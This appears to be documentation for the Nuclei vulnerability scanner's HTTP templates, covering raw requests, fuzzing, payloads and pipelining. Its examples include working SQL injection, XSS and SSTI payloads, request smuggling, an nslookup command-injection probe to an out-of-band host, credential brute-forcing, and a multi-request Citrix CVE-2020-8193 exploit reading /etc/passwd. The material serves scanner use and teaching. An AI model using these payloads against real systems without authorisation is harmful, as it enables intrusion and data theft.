# HTTP

# Basic HTTP Protocol

Learn about using Basic HTTP with Nuclei

Nuclei offers extensive support for various features related to HTTP protocol. Raw and Model based HTTP requests are supported, along with options Non-RFC client requests support too. Payloads can also be specified and raw requests can be transformed based on payload values along with many more capabilities that are shown later on this Page.

HTTP Requests start with a **`request`** block which specifies the start of the requests for the template.

```yaml
# Start the requests for the template right here
http:
```

## **Method**

Request method can be **GET**, **POST**, **PUT**, **DELETE**, etc. depending on the needs.

```yaml
# Method is the method for the request
method: GET
```

**Redirects**

Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with **`redirects: true`** in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using **`max-redirects`**field.

An example of the usage:

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/login.php"
    redirects: true
    max-redirects: 3
```

Currently redirects are defined per template, not per request.

## **Path**

The next part of the requests is the **path** of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime.

Variables start with **`{{`** and end with **`}}`** and are case-sensitive.

**`{{BaseURL}}`** - This will replace on runtime in the request by the input URL as specified in the target file.

**`{{RootURL}}`** - This will replace on runtime in the request by the root URL as specified in the target file.

**`{{Hostname}}`** - Hostname variable is replaced by the hostname including port of the target on runtime.

**`{{Host}}`** - This will replace on runtime in the request by the input host as specified in the target file.

**`{{Port}}`** - This will replace on runtime in the request by the input port as specified in the target file.

**`{{Path}}`** - This will replace on runtime in the request by the input path as specified in the target file.

**`{{File}}`** - This will replace on runtime in the request by the input filename as specified in the target file.

**`{{Scheme}}`** - This will replace on runtime in the request by protocol scheme as specified in the target file.

An example is provided below - [**https://example.com:443/foo/bar.php**](https://example.com/foo/bar.php)

| **Variable** | **Value** |
| --- | --- |
| **`{{BaseURL}}`** | [**https://example.com:443/foo/bar.php**](https://example.com/foo/bar.php) |
| **`{{RootURL}}`** | [**https://example.com:443**](https://example.com/) |
| **`{{Hostname}}`** | example.com:443 |
| **`{{Host}}`** | example.com |
| **`{{Port}}`** | 443 |
| **`{{Path}}`** | /foo |
| **`{{File}}`** | bar.php |
| **`{{Scheme}}`** | https |

Some sample dynamic variable replacement examples:

```yaml
path: "{{BaseURL}}/.git/config"
# This path will be replaced on execution with BaseURL
# If BaseURL is set to  https://abc.com then the
# path will get replaced to the following: https://abc.com/.git/config
```

Multiple paths can also be specified in one request which will be requested for the target.

## **Headers**

Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this:

```yaml
# headers contain the headers for the request
headers:
  # Custom user-agent header
  User-Agent: Some-Random-User-Agent
  # Custom request origin
  Origin: https://google.com
```

## **Body**

Body specifies a body to be sent along with the request. For instance:

```yaml
# Body is a string sent along with the request
body: "{\"some random JSON\"}"

# Body is a string sent along with the request
body: "admin=test"
```

## **Session**

To maintain a cookie-based browser-like session between multiple requests, cookies are reused by default. This is beneficial when you want to maintain a session between a series of requests to complete the exploit chain or to perform authenticated scans. If you need to disable this behavior, you can use the disable-cookie field.

```yaml
# disable-cookie accepts boolean input and false as default
disable-cookie: true
```

## **Request Condition**

Request condition allows checking for the condition between multiple requests for writing complex checks and exploits involving various HTTP requests to complete the exploit chain.

The functionality will be automatically enabled if DSL matchers/extractors contain numbers as a suffix with respective attributes.

For example, the attribute **`status_code`** will point to the effective status code of the current request/response pair in elaboration. Previous responses status codes are accessible by suffixing the attribute name with **`_n`**, where n is the n-th ordered request 1-based. So if the template has four requests and we are currently at number 3:

- **`status_code`**: will refer to the response code of request number 3
- **`status_code_1`** and **`status_code_2`** will refer to the response codes of the sequential responses number one and two

For example with **`status_code_1`**, **`status_code_3`**, and**`body_2`**:

```yaml
matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')"
```

Request conditions might require more memory as all attributes of previous responses are kept in memory

## **Example HTTP Template**

The final template file for the **`.git/config`** file mentioned above is as follows:

```yaml
id: git-config

info:
  name: Git Config File
  author: Ice3man
  severity: medium
  description: Searches for the pattern /.git/config on passed URLs.

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
    matchers:
      - type: word
        words:
          - "[core]"
```

# Raw HTTP

Learn about using Raw HTTP with Nuclei

Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it’s suggested to leave the **`Host`** header as in the example with the variable **`{{Hostname}}`**), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above.

```yaml
http:
  - raw:
    - |
        POST /path2/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        a=test&b=pd
```

Requests can be fine-tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers.

RAW request format also supports [**various helper functions**](https://docs.projectdiscovery.io/templates/reference/helper-functions) letting us do run time manipulation with input. An example of the using a helper function in the header.

```yaml
- raw:
      - |
        GET /manager/html HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time.
```

To make a request to the URL specified as input without any additional tampering, a blank Request URI can be used as specified below which will make the request to user specified input.

```yaml
- raw:
      - |
        GET HTTP/1.1
        Host: {{Hostname}}
```

# HTTP Fuzzing

Learn about fuzzing HTTP requests with Nuclei

Nuclei supports fuzzing of HTTP requests based on rules defined in the **`fuzzing`** section of the HTTP request. This allows creating templates for generic Web Application vulnerabilities like SQLi, SSRF, CMDi, etc without any information of the target like a classic web fuzzer. We call this concept as **Fuzzing for Unknown Vulnerabilities**.

### **pre-condition**

More often than not, we want to only attempt fuzzing on those requests where it makes sense. For example,

- Fuzz Body When Body is Present
- Ignore PreFlight and CONNECT requests

and so on. With Nuclei v3.2.4 we have introduced a new **`pre-condition`** section which contains conditions when the fuzzing template should be executed.

pre-condition can be considered a twin of [**matchers**](https://docs.projectdiscovery.io/templates/reference/matchers) in nuclei. They support all matcher types, including DSL, and the only difference is that this serves a different purpose.

For example, to only execute template on POST request with some body, you can use the following filter.

```yaml
- pre-condition:
    - type: dsl
      dsl:
        - method == POST
        - len(body) > 0
      condition: and
```

Currently, Only request data like header, host, input, method, path, etc is available, but soon, response data will be available once the support for loading the response along with the request is added.

When writing/executing a template, you can use the -v -svd flags to see all variables available in filters before applying the filter.

### **Part**

Part specifies what part of the request should be fuzzed based on the specified rules. Available options for this parameter are -

**query** (**`default`**) - fuzz query parameters for URL

```yaml
fuzzing:
  - part: query # fuzz parameters in URL query
```

**path** - fuzz path parameters for requests

```yaml
fuzzing:
  - part: path # fuzz path parameters
```

**header** - fuzz header parameters for requests

```yaml
fuzzing:
  - part: header # fuzz headers
```

**cookie** - fuzz cookie parameters for requests

```yaml
fuzzing:
  - part: cookie # fuzz cookies
```

**body** - fuzz body parameters for requests

```yaml
fuzzing:
  - part: body # fuzz parameters in body
```

### **Special Part**

**request** - fuzz the entire request (all parts mentioned above)

```yaml
fuzzing:
  - part: request # fuzz entire request
```

### **Multiple selective parts**

Multiple parts can be selected for fuzzing by defining a **`parts`** field which is the plural of above allowing selected multiple parts to be fuzzed.

```yaml
fuzzing:
  - parts:
      - query
      - body
      - header
```

### **Type**

Type specifies the type of replacement to perform for the fuzzing rule value. Available options for this parameter are -

1. **replace** (**`default`**) - replace the value with payload
2. **prefix** - prefix the value with payload
3. **postfix** - postfix the value with payload
4. **infix** - infix the value with payload (place in between)
5. **replace-regex** - replace the value with payload using regex

```yaml
fuzzing:
  - part: query
    type: postfix # Fuzz query and postfix payload to params
```

### **Key-Value Abstraction**

In a HTTP request, there are various parts like query, path, headers, cookies, and body and each part has different in various formats. For example, the query part is a key-value pair, the path part is a list of values, the body part can be a JSON, XML, or form-data.

To effectively abstract these parts and allow them to be fuzzed, Nuclei exposes these values as **`key`** and **`value`** pairs. This allows users to fuzz based on the key or value of the request part.

For example, Below sample HTTP request can be abstracted as key-value pairs as shown below.

```yaml
POST /reset-password?token=x0x0x0&source=app HTTP/1.1
Host: 127.0.0.1:8082
User-Agent: Go-http-client/1.1
Cookie: PHPSESSID=1234567890
Content-Length: 23
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

{"password":"12345678"}
```

- **`part: Query`**

| **key** | **value** |
| --- | --- |
| token | x0x0x0 |
| source | app |
- **`part: Path`**

| **key** | **value** |
| --- | --- |
| value | /reset-password |
- **`part: Header`**

| **key** | **value** |
| --- | --- |
| Host | 127.0.0.1:8082 |
| User-Agent | Go-http-client/1.1 |
| Content-Length | 23 |
| Content-Type | application/json |
| Accept-Encoding | gzip |
| Connection | close |
- **`part: Cookie`**

| **key** | **value** |
| --- | --- |
| PHPSESSID | 1234567890 |
- **`part: Body`**

| **key** | **value** |
| --- | --- |
| password | 12345678 |

**Note:** XML, JSON, Form, Multipart-FormData will be in kv format, but if the Body is binary or in any other format, the entire Body will be represented as a single key-value pair with key as **`value`** and value as the entire Body.

| **key** | **value** |
| --- | --- |
| value | ”\x08\x96\x01\x12\x07\x74” |

This abstraction really levels up the game since you only need to write a single rule for the Body, and it will be applied to all formats. For example, if you check for SQLi in body values, a single rule will work on all formats, i.e., JSON, XML, Form, Multipart-FormData, etc.

### **Mode**

Mode specifies the mode in which to perform the replacements. Available modes are -

1. **multiple** (**`default`**) - replace all values at once
2. **single** - replace one value at a time

```yaml
fuzzing:
  - part: query
    type: postfix
    mode: multiple # Fuzz query postfixing payloads to all parameters at once
```

> Note: default values are set/used when other options are not defined.
> 

### **Component Data Filtering**

Multiple filters are supported to restrict the scope of fuzzing to only interesting parameter keys and values. Nuclei HTTP Fuzzing engine converts request parts into Keys and Values which then can be filtered by their related options.

The following filter fields are supported -

1. **keys** - list of parameter names to fuzz (exact match)
2. **keys-regex** - list of parameter regex to fuzz
3. **values** - list of value regex to fuzz

These filters can be used in combination to run highly targeted fuzzing based on the parameter input. A few examples of such filtering are provided below.

```yaml
# fuzzing command injection based on parameter name value
fuzzing:
  - part: query
    type: replace
    mode: single
    keys:
      - "daemon"
      - "upload"
      - "dir"
      - "execute"
      - "download"
      - "log"
      - "ip"
      - "cli"
      - "cmd"
```

```yaml
# fuzzing openredirects based on parameter name regex
fuzzing:
  - part: query
    type: replace
    mode: single
    keys-regex:
      - "redirect.*"
```

```yaml
# fuzzing ssrf based on parameter value regex
fuzzing:
  - part: query
    type: replace
    mode: single
    values:
      - "https?://.*"
```

### **Fuzz**

Fuzz specifies the values to replace with a **`type`** for a parameter. It supports payloads, DSL functions, etc and allows users to fully utilize the existing nuclei feature-set for fuzzing purposes.

```yaml
# fuzz section for xss fuzzing with stop-at-first-match
payloads:
  reflection:
    - "6842'\"><9967"
stop-at-first-match: true
fuzzing:
  - part: query
    type: postfix
    mode: single
    fuzz:
      - "{{reflection}}"
```

```yaml
# using interactsh-url placeholder for oob testing
payloads:
  redirect:
    - "{{interactsh-url}}"
fuzzing:
  - part: query
    type: replace
    mode: single
    keys:
      - "dest"
      - "redirect"
      - "uri"
    fuzz:
      - "https://{{redirect}}"
```

```yaml
# using template-level variables for SSTI testing
variables:
  first: "{{rand_int(10000, 99999)}}"
  second: "{{rand_int(10000, 99999)}}"
  result: "{{to_number(first)*to_number(second)}}"

http:
    ...
    payloads:
      reflection:
        - '{{concat("{{", "§first§*§second§", "}}")}}'
    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{reflection}}"
```

### **Analyzer**

Analyzers is a new concept introduced in nuclei fuzzing which allow the engine to make additional verification requests based on a certain logic to verify the vulnerability.

### **time_delay**

The **`time_delay`** analyzer verifies that the response time of the request is controllable by the fuzzed payload. It uses a Linear Regression algorithm ported from ZAP with alternating requests to determine the server time is actually controllable rather than just noise. You can configure it like so

```yaml
# Create a new time delay analyzer
analyzer:
  name: time_delay
  # Optionally, you can define parameters for the
  # analyzer like below.
  # 
  # the defaults are good enough for most use cases. 
  parameters:
    sleep_duration: 10 # sleep for 10 seconds (default: 5)
    requests_limit: 6 # make 6 verification requests (default: 4)
    time_correlation_error_range: 0.30 # error range for time correlation (default: 0.15)
    time_slope_error_range: 0.40 # error range for time slope (default: 0.30)
```

The following dynamic placeholders are available in payloads with **`time_delay`** analyzer.

- **`[SLEEPTIME]`** - The sleep time in seconds for the time delay analyzer.
- **`[INFERENCE]`** - The inference condition (%d=%d) for the time delay analyzer.

These values are substituted at runtime with the actual values for the analyzer. The following is how a usual verification process looks.

1. Send the request with the payload to the target with 5 second delay.
2. If the response time is less than 5, do nothing.
3. Send the request to the analyzer which queues it with 5 seconds delay.
4. Next a 1 second delay
5. Next a 5 second delay
6. Finally, the last 1 second delay.

If the response time is controllable, the analyzer will report the vulnerability.

Matching for the analyzer matches is pretty straightforward as well. Simiar to interactsh, you can use **`part: analyzer`** to match the analyzer response.

```yaml
matchers:
  - type: word
    part: analyzer
    words:
      - "true"
```

Optionally, you can also extract the **`analyzer_details`** from the analyzer for matches.

### **Example Fuzzing template**

An example sample template for fuzzing XSS vulnerabilities is provided below.

```yaml
id: fuzz-reflection-xss

info:
  name: Basic Reflection Potential XSS Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run if method is GET
    payloads:
      reflection:
        - "6842'\"><9967"

    stop-at-first-match: true
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"
```

## **Basic SSTI Template**

A simple template to discover **`{{<number>*<number>}}`** type SSTI vulnerabilities.

```yaml
id: fuzz-reflection-ssti

info:
  name: Basic Reflection Potential SSTI Detection
  author: pdteam
  severity: low

variables:
  first: "{{rand_int(10000, 99999)}}"
  second: "{{rand_int(10000, 99999)}}"
  result: "{{to_number(first)*to_number(second)}}"

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      reflection:
        - '{{concat("{{", "§first§*§second§", "}}")}}'

    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{reflection}}"

    matchers:
      - type: word
        part: body
        words:
          - "{{result}}"
```

## **Blind Time Based SQLi Template**

A template to detect blind time based SQLi with a time delay analyzer.

```yaml
id: mysql-blind-time-based-sqli

info:
  name: MySQL SQLi - Blind Time based
  author: pdteam
  severity: critical
  reference:
    - https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/SqlInjectionMySqlScanRule.java

http:
  - payloads:
      injections:
        low:
          - " / sleep([SLEEPTIME]) "
          - "' / sleep([SLEEPTIME]) / '"
          - "\" / sleep([SLEEPTIME]) / \""
        medium:
          - " and 0 in (select sleep([SLEEPTIME]) ) -- "
          - "' and 0 in (select sleep([SLEEPTIME]) ) -- "
          - "\" and 0 in (select sleep([SLEEPTIME]) ) -- "
          - " where 0 in (select sleep([SLEEPTIME]) ) -- "
          - "' where 0 in (select sleep([SLEEPTIME]) ) -- "
          - "\" where 0 in (select sleep([SLEEPTIME]) ) -- "
        high:
          - "\" where 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
          - " and 0 in (select sleep([SLEEPTIME]) ) "
          - "' and 0 in (select sleep([SLEEPTIME]) ) and ''='"
          - "\" and 0 in (select sleep([SLEEPTIME]) ) and \"\"=\""
          
    attack: pitchfork
    analyzer:
      name: time_delay
        
    fuzzing:
      - part: request # fuzz all the request parts.
        type: postfix
        mode: single
        fuzz:
          - "{{injections}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: analyzer
        words:
          - "true"
```

## **Basic XSS Template**

A simple template to discover XSS probe reflection in HTML pages.

```yaml
id: fuzz-reflection-xss

info:
  name: Basic Reflection Potential XSS Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      reflection:
        - "6842'\"><9967"

    stop-at-first-match: true
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"
```

## **Basic OpenRedirect Template**

A simple template to discover open-redirects issues.

```yaml
id: fuzz-open-redirect

info:
  name: Basic Open Redirect Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      redirect:
        - "https://example.com"

    fuzzing:
      - part: query
        type: replace
        mode: single
        keys-regex:
          - "redirect.*"
        fuzz:
          - "{{redirect}}"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "{{redirect}}"

      - type: status
        status:
          - 301
          - 302
          - 307
```

## **Basic Path Based SQLi**

A example template to discover path-based SQLi issues.

```yaml
http:
    # pre-condition to determine if the template should be executed
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "POST"'       # only run if method is POST
          - 'contains(path,"reset")' # only run if path contains reset word
        condition: and

    # fuzzing rules
    fuzzing:
      - part: header # This rule will be applied to the header
        type: replace # replace the type of rule (i.e., existing values will be replaced with payload)
        mode: multiple # multiple mode (i.e., all existing values will be replaced/used at once)
        fuzz:
          X-Forwarded-For: "{{domain}}"  # here {{domain}} is attacker-controlled server
          X-Forwarded-Host: "{{domain}}"
          Forwarded: "{{domain}}"
          X-Real-IP: "{{domain}}"
          X-Original-URL: "{{domain}}"
          X-Rewrite-URL: "{{domain}}"
          Host: "{{domain}}"
```

## **Basic Host Header Injection**

A simple template to discover host header injection issues.

```yaml
http:
    # pre-condition to determine if the template should be executed
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "POST"'       # only run if method is POST
          - 'contains(path,"reset")' # only run if path contains reset word
        condition: and

    # fuzzing rules
    fuzzing:
      - part: header # This rule will be applied to the header
        type: replace # replace the type of rule (i.e., existing values will be replaced with payload)
        mode: multiple # multiple mode (i.e., all existing values will be replaced/used at once)
        fuzz:
          X-Forwarded-For: "{{domain}}"  # here {{domain}} is attacker-controlled server
          X-Forwarded-Host: "{{domain}}"
          Forwarded: "{{domain}}"
          X-Real-IP: "{{domain}}"
          X-Original-URL: "{{domain}}"
          X-Rewrite-URL: "{{domain}}"
          Host: "{{domain}}"
```

## **Blind SSRF OOB Detection**

A simple template to detect Blind SSRF in known-parameters using interactsh with HTTP fuzzing.

```yaml
id: fuzz-ssrf

info:
  name: Basic Blind SSRF Detection
  author: pdteam
  severity: low

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      redirect:
        - "{{interactsh-url}}"

    fuzzing:
      - part: query
        type: replace
        mode: single
        keys:
          - "dest"
          - "redirect"
          - "uri"
          - "path"
          - "continue"
          - "url"
          - "window"
          - "next"
          - "data"
          - "reference"
          - "site"
          - "html"
          - "val"
          - "validate"
          - "domain"
          - "callback"
          - "return"
          - "page"
          - "feed"
          - "host"
          - "port"
          - "to"
          - "out"
          - "view"
          - "dir"
          - "show"
          - "navigation"
          - "open"
        fuzz:
          - "https://{{redirect}}"

    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "http"
```

## **Blind CMDi OOB based detection**

A simple template to detect blind CMDI using interactsh

```yaml
id: fuzz-cmdi

info:
  name: Basic Blind CMDI Detection
  author: pdteam
  severity: low

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      redirect:
        - "{{interactsh-url}}"
    fuzzing:
        fuzz:
          - "nslookup {{redirect}}"
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"
```

# Unsafe HTTP

Learn about using rawhttp or unsafe HTTP with Nuclei

Nuclei supports [**rawhttp**](https://github.com/projectdiscovery/rawhttp) for complete request control and customization allowing **any kind of malformed requests** for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more.

**rawhttp** library is disabled by default and can be enabled by including **`unsafe: true`** in the request block.

Here is an example of HTTP request smuggling detection template using **`rawhttp`**.

```yaml
http:
  - raw:
    - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 150
        Transfer-Encoding: chunked

        0

        GET /post?postId=5 HTTP/1.1
        User-Agent: a"/><script>alert(1)</script>
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 5

        x=1
    - |+
        GET /post?postId=5 HTTP/1.1
        Host: {{Hostname}}

    unsafe: true # Enables rawhttp client
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "<script>alert(1)</script>")'
```

# HTTP Payloads

Learn about bruteforcing HTTP requests using payloads with Nuclei

## **Overview**

Nuclei engine supports brute forcing any value/component of HTTP Requests using payloads module, that allows to run various type of payloads in multiple format, It’s possible to define placeholders with simple keywords (or using brackets **`{{helper_function(variable)}}`** in case mutator functions are needed), and perform **batteringram**, **pitchfork** and **clusterbomb**attacks.

The **wordlist** for these attacks needs to be defined during the request definition under the **`payload`** field, with a name matching the keyword. Nuclei supports both file-based and in template wordlist support and finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values.

Note that if you are developing a file-based payload and storing it outside the Nuclei templates directory, you must run Nuclei with the **`-lfa`** (or **`-allow-local-file-access`**) flag. This is necessary to allow access to local files that are not within the default templates directory.

Payloads are defined using variable name and can be referenced in the request in between **`{{ }}`** marker.

### **Difference between HTTP Payloads and HTTP Fuzzing**

While both may sound similar, the major difference between  **Fuzzing** and **Payloads/BruteForce** is that Fuzzing is a superset of Payloads/BruteForce and has extra features related to finding Unknown Vulnerabilities while Payloads is just plain brute forcing of values with a given attack type and set of payloads.

## **Examples**

An example of the using payloads with local wordlist:

```yaml
# HTTP Intruder fuzzing using local wordlist.

payloads:
  paths: params.txt
  header: local.txt
```

An example of the using payloads with in template wordlist support:

```yaml
# HTTP Intruder fuzzing using in template wordlist.

payloads:
  password:
    - admin
    - guest
    - password
```

**Note:** be careful while selecting attack type, as unexpected input will break the template.

For example, if you used **`clusterbomb`** or **`pitchfork`** as attack type and defined only one variable in the payload section, template will fail to compile, as **`clusterbomb`** or **`pitchfork`**expect more than one variable to use in the template.

## **Attack mode**

Nuclei engine supports multiple attack types, including **`batteringram`** as default type which generally used to fuzz single parameter, **`clusterbomb`** and **`pitchfork`** for fuzzing multiple parameters which works same as classical burp intruder.

| **Type** | **batteringram** | **pitchfork** | **clusterbomb** |
| --- | --- | --- | --- |
| **Support** | ✔ | ✔ | ✔ |

### **batteringram**

The battering ram attack type places the same payload value in all positions. It uses only one payload set. It loops through the payload set and replaces all positions with the payload value.

### **pitchfork**

The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on.

It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on.

### **clusterbomb**

The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations.

It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on.

This attack type is useful for a brute-force attack. Load a list of commonly used usernames in the first payload set, and a list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations.

More details [**here**](https://www.sjoerdlangkemper.nl/2017/08/02/burp-intruder-attack-types/).

## **Attack Mode Example**

An example of the using **`clusterbomb`** attack to fuzz.

```yaml
http:
  - raw:
      - |
        POST /?file={{path}} HTTP/1.1
        User-Agent: {{header}}
        Host: {{Hostname}}

    attack: clusterbomb # Defining HTTP fuzz attack type
    payloads:
      path: helpers/wordlists/prams.txt
      header: helpers/wordlists/header.txt
```

# **HTTP Payloads Examples**

Review some HTTP payload examples for Nuclei

## **HTTP Intruder Bruteforcing**

This template makes a defined POST request in RAW format along with in template defined payloads running **`clusterbomb`** intruder and checking for string match against response.

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

# HTTP Intruder bruteforcing with in template payload support. 

http:

  - raw:
      - |
        POST /?username=§username§&paramb=§password§ HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)
        Host: {{Hostname}}
        another_header: {{base64('§password§')}}
        Accept: */*

        body=test

    payloads:
      username:
        - admin

      password:
        - admin
        - guest
        - password
        - test
        - 12345
        - 123456

    attack: clusterbomb # Available: batteringram,pitchfork,clusterbomb

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

## **BruteForcing multiple requests**

This template makes a defined POST request in RAW format along with wordlist based payloads running **`clusterbomb`** intruder and checking for string match against response.

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

http:

  - raw:
      - |
        POST /?param_a=§param_a§&paramb=§param_b§ HTTP/1.1
        User-Agent: §param_a§
        Host: {{Hostname}}
        another_header: {{base64('§param_b§')}}
        Accept: */*

        admin=test

      - |
        DELETE / HTTP/1.1
        User-Agent: nuclei
        Host: {{Hostname}}

        {{sha256('§param_a§')}} 

      - |
        PUT / HTTP/1.1
        Host: {{Hostname}}

        {{html_escape('§param_a§')}} + {{hex_encode('§param_b§')}}

    attack: clusterbomb # Available types: batteringram,pitchfork,clusterbomb
    payloads:
      param_a: payloads/prams.txt
      param_b: payloads/paths.txt

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

## **Authenticated Bruteforcing**

This template makes a subsequent HTTP requests with defined requests maintaining sessions between each request and checking for string match against response.

```yaml
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

      - |
        POST /testing HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

        testing=parameter

    matchers:
      - type: word
        words:
          - "Test is test matcher text"
```

# **Value Sharing**

Learn about sharing values between HTTP requests in the HTTP template.

## **HTTP Value Sharing**

In Nuclei, It is possible to extract value from one HTTP request and share/reuse it in another HTTP request. This has various use-cases like login, CSRF tokens and other complex.

This concept of value sharing is possible using [**Dynamic Extractors**](https://docs.projectdiscovery.io/templates/reference/extractors#dynamic-extractor). Here’s a simple example demonstrating value sharing between HTTP requests.

This template makes a subsequent HTTP requests maintaining sessions between each request, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response.

```yaml
id: CVE-2020-8193

info:
  name: Citrix unauthenticated LFI
  author: pdteam
  severity: high
  reference: https://github.com/jas502n/CVE-2020-8193

http:
  - raw:
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/xml
        X-NITRO-USER: xpyZxwy6
        X-NITRO-PASS: xWXHUJ56

        <appfwprofile><login></login></appfwprofile>

      - |
        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/neo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/stc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <appfwprofile><login></login></appfwprofile>

      - |
        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <clipermission></clipermission>

    extractors:
      - type: regex
        name: randkey # Variable name
        part: body
        internal: true
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"

    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
```

## **Connection Tampering**

Learn more about using HTTP pipelining and connection pooling with Nuclei

### **Pipelining**

HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from [**http-desync-attacks-request-smuggling-reborn**](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn).

Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP request engine.

If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, [**httpx**](https://github.com/projectdiscovery/)has a flag **`-pipeline`** to do so.

An example configuring showing pipelining attributes of nuclei.

```yaml
		unsafe: true
    pipeline: true
    pipeline-concurrent-connections: 40
    pipeline-requests-per-connection: 25000
```

An example template demonstrating pipelining capabilities of nuclei has been provided below-

```yaml
id: pipeline-testing
info:
  name: pipeline testing
  author: pdteam
  severity: info

http:
  - raw:
      - |+
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}

    attack: batteringram
    payloads:
      path: path_wordlist.txt

    unsafe: true
    pipeline: true
    pipeline-concurrent-connections: 40
    pipeline-requests-per-connection: 25000

    matchers:
      - type: status
        part: header
        status:
          - 200
```

### **Connection pooling**

While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement.

To enable connection pooling in the template, **`threads`** attribute can be defined with respective number of threads you wanted to use in the payloads sections.

**`Connection: Close`** header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests with pooling.

